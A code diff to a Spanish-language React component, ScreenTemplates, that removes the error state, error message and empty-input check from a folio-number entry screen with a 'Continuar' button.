@@ -36,7 +36,6 @@ interface ScreenTemplatesProps {
     comercio?: string;
     mensaje?: string;
     alias?: string;
-    error?: boolean;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -149,22 +148,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <Input 
                 type="text" 
                 placeholder="Ingrese su número de folio" 
-                className={`w-full border rounded p-2 ${
-                  screenData.error ? 'border-red-500 bg-red-50 mb-1' : 'border-gray-300 mb-3'
-                }`}
+                className="w-full border border-gray-300 rounded p-2 mb-3"
                 value={folioInput}
                 onChange={(e) => setFolioInput(e.target.value)}
               />
-              {screenData.error && (
-                <p className="text-red-500 text-sm mt-1 mb-2">
-                  Folio incorrecto. Por favor verifique e intente de nuevo.
-                </p>
-              )}
             </div>
             <Button 
               className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
-              disabled={!folioInput.trim()}
             >
               Continuar
             </Button>
